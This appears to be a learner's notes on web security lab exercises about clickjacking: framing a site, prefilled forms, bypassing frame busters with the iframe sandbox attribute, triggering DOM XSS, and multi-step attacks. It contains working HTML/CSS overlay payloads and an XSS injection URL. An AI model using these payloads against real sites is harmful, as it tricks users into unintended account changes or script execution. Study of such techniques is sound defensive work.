# Encounters

# Basic Clickjacking with CSRF token protection
## Observations
- Website contains login functionality with the ability to delete account that's protected by CSRF token. Users will click on the word "click". 


# Clickjacking with form input data prefilled from a URL parameter
## Observations
It is possible to change the email address of the user via an update email button in the console. 
- The change email address can be prefilled by adding the email parameter to the URL so we can serve that via the URL in the iframe. 
```
<style>
    iframe {
        position:relative;
        width:700;
        height: 500;
        opacity: 50%;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450;
        left:90;
        z-index: 1;
    }
</style>
<div>click</div>
<iframe src="https://URL"></iframe>
```

They key is making sure the click is over the action you want the victim to take. 

# Clickjacking with Frame Buster
. A common client-side protection enacted through the web browser is to use frame busting or frame breaking scripts. These can be implemented via proprietary browser JavaScript add-ons or extensions such as NoScript. Scripts are often crafted so that they perform some or all of the following behaviors:

check and enforce that the current application window is the main or top window,
make all frames visible,
prevent clicking on invisible frames,
intercept and flag potential clickjacking attacks to the user.
Frame busting techniques are often browser and platform specific and because of the flexibility of HTML they can usually be circumvented by attackers. As frame busters are JavaScript then the browser's security settings may prevent their operation or indeed the browser might not even support JavaScript. An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute. When this is set with the allow-forms or allow-scripts values and the allow-top-navigation value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:
```
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```
Both the allow-forms and allow-scripts values permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviors while allowing functionality within the targeted site.
## Observations
-- Pretty much the same thing but the JavaScript within the page doesn't allow framing:
```
<script>
    if(top != self) {
        window.addEventListener("DOMContentLoaded", function() {
            document.body.innerHTML = 'This page cannot be framed';
    }, false);
}
</script>
```

```
<style>
    iframe {
        position:relative;
        width:700;
        height: 500;
        opacity: 50%;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450;
        left:90;
        z-index: 1;
    }
</style>
<div>click</div>
<iframe id="Victim Site" src="URL" sandbox="allow-forms"></iframe>
```


# Clickjacking to trigger DOM-xss
## Observations
This site allows users to submit feedback and the user's name is loaded into the DOM innerhtml upon submission but it has a CSRF token on it. 

```
<style>
    iframe {
        position:absolute;
        width:1000px;
        height: 900px;
        opacity: 0.0001%;
        z-index: 2;
    }
    div {
        position:absolute;
        top:820;
        left:100;
        z-index: 1;
    }
</style>
<div>Click Me</div>
<iframe src="https://0a17006704fbc76780058a5e00800058.web-security-academy.net/feedback?name=<img src=x onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test"></iframe>
```

- Used param miner, JS analysis, and the form field to ensure that I had the params correct.

# Multi-step click jacking
To get a user to delete their account they need to click two times on different buttons in different positions. This will require creating two elements. 

```
<style>
	iframe {
		position:relative;
		width:900px;
		height: 800;
		opacity: 50%;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:500;
		left:90;
		z-index: 1;
	}
   .secondClick {
		top:300;
		left:180;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="URL"></iframe>
```
